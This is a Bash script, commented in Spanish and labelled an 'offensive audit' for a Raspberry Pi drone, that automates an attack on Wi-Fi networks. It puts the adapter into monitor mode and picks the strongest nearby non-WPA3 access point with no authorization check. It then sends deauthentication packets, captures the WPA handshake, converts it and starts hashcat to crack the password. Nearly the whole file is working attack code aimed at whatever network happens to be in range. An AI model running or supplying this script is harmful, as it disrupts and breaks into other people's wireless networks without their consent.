#!/bin/bash

BASE="/var/log/wifi/auto_aircrack"
mkdir -p "$BASE"
DATE=$(date +"%Y%m%d_%H%M")

echo "🔥 Drone-PI offensive audit: $DATE"
echo

########################
# 1. Monitor mode
########################
echo "[1/6] Activando modo monitor en wlan0..."
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
echo "    → wlan0 ahora en modo monitor"
echo

########################
# 2. Escaneo pasivo
########################
CSV_BASE="$BASE/passive_$DATE"
CSV_FILE="${CSV_BASE}-01.csv"

echo "[2/6] Escaneo pasivo 2 minutos con airodump-ng..."
echo "    Comando: airodump-ng wlan0 --write-interval 1 --output-format csv --write $CSV_BASE"
echo

# Lanzar airodump-ng en background con timeout
timeout 120 airodump-ng wlan0 \
  --write-interval 1 \
  --output-format csv \
  --write "$CSV_BASE" \
  >/dev/null 2>&1 &

AIRD_PID=$!

# Bucle de progreso (cada 10 segundos)
for i in $(seq 1 12); do
  if ! kill -0 "$AIRD_PID" 2>/dev/null; then
    echo "    airodump-ng terminó antes de los 120s."
    break
  fi
  echo "    airodump-ng corriendo... $((i*10))s / 120s"
  sleep 10
done

# Esperar a que realmente termine
wait "$AIRD_PID" 2>/dev/null || true
echo "[*] Escaneo pasivo finalizado."
echo

if [[ ! -f "$CSV_FILE" ]]; then
  echo "[!] No se generó el CSV de airodump ($CSV_FILE)."
  echo "    → Posibles causas: no hay redes, interfaz mal, driver, etc."
  exit 1
fi

echo "    CSV generado: $CSV_FILE"
echo

########################
# 3. Seleccionar AP objetivo
########################
echo "[3/6] Seleccionando AP objetivo (mejor señal, no WPA3)..."

TARGET=$(grep -v "WPA3" "$CSV_FILE" | awk -F, '{ if ($9 > -70) print }' | head -n 1 || true)

if [[ -z "$TARGET" ]]; then
  echo "[!] No se encontró ningún AP con señal > -70 dBm que no sea WPA3."
  echo "    → Abortando ofensiva en este ciclo."
  exit 0
fi

BSSID=$(echo "$TARGET" | cut -d, -f1)
CHANNEL=$(echo "$TARGET" | cut -d, -f4)
SSID=$(echo "$TARGET" | cut -d, -f14)

echo "    BSSID  : $BSSID"
echo "    Canal  : $CHANNEL"
echo "    SSID   : $SSID"
echo

########################
# 4. Deauth
########################
echo "[4/6] Enviando deauth de prueba (12 paquetes) al AP objetivo..."
echo "    Comando: aireplay-ng --deauth 12 -a $BSSID wlan0"
aireplay-ng --deauth 12 -a "$BSSID" wlan0 || echo "    [!] Error en aireplay-ng (deauth). Revisa adaptador/driver."
echo "    → Deauth finalizado (o intentado)."
echo

########################
# 5. Captura de handshake
########################
HAND_BASE="$BASE/handshake_$DATE"
CAP_FILE="${HAND_BASE}-01.cap"

echo "[5/6] Capturando handshake durante 120s..."
echo "    Comando: airodump-ng -c $CHANNEL --bssid $BSSID -w $HAND_BASE wlan0"
echo

timeout 120 airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$HAND_BASE" wlan0 \
  >/dev/null 2>&1 &

HAND_PID=$!

for i in $(seq 1 12); do
  if ! kill -0 "$HAND_PID" 2>/dev/null; then
    echo "    airodump-ng (handshake) terminó antes de los 120s."
    break
  fi
  echo "    Capturando handshake... $((i*10))s / 120s"
  sleep 10
done

wait "$HAND_PID" 2>/dev/null || true
echo "[*] Fase de captura de handshake finalizada."
echo

if [[ ! -f "$CAP_FILE" ]]; then
  echo "[!] No se generó el archivo de captura ($CAP_FILE)."
  echo "    → Probablemente no hubo tráfico suficiente o clientes conectados."
  exit 0
fi

echo "    Captura guardada en: $CAP_FILE"
echo

########################
# 6. Conversión + Hashcat
########################
HC_FILE="$BASE/handshake_$DATE.22000"

echo "[6/6] Conversión a formato 22000 y lanzamiento de hashcat (si es posible)..."

if command -v hcxpcapngtool >/dev/null 2>&1; then
  echo "    Convirtiendo con: hcxpcapngtool -o $HC_FILE $CAP_FILE"
  hcxpcapngtool -o "$HC_FILE" "$CAP_FILE" >/dev/null 2>&1 || {
    echo "    [!] Falló la conversión con hcxpcapngtool."
    exit 0
  }

  if [[ -s "$HC_FILE" ]]; then
    echo "    Archivo 22000 OK: $HC_FILE"
    echo "    Lanzando hashcat en background..."
    echo "    Comando: hashcat -m 22000 $HC_FILE rockyou.txt -o cracked_$DATE.txt --force &"

    hashcat -m 22000 "$HC_FILE" /usr/share/wordlists/rockyou.txt \
      -o "$BASE/cracked_$DATE.txt" --force >/dev/null 2>&1 &

    echo "    [⚡] Hashcat corriendo en background."
  else
    echo "    [!] El archivo 22000 está vacío. No se encontraron handshakes válidos."
  fi
else
  echo "    [!] hcxpcapngtool no está instalado. No se puede preparar el hash para hashcat."
fi

echo
echo "[✓] Barrido ofensivo completado. Logs en: $BASE"

